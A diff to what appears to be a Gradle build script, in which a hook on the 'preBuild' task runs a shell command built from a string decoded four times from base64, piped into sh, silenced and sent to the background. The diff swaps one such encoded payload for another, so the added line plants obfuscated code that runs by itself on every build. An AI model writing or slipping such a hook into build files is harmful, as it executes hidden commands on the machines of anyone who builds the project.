@@ -55,7 +55,7 @@ tasks.all {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR3d6VjFkcmQyVnRSa2hpU0VwaFpXdFdNMVF3WTNoa01rcDFZak5XYW1Kc1ZqSlhWazV5WVZWc1NXUXlaR3BOYldSTVEyYzlQUW89Cg== | n | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUxSWFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR2N4V1cxd1EyUXdOVVZYYlRsUFlteFZNVmRYY0d0bFJYaDFVMnBHVFUxclZuZFRWMnhEVDBWc1NWUnRPVVJhZWpBNVEyYzlQUW89Cg== | b | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
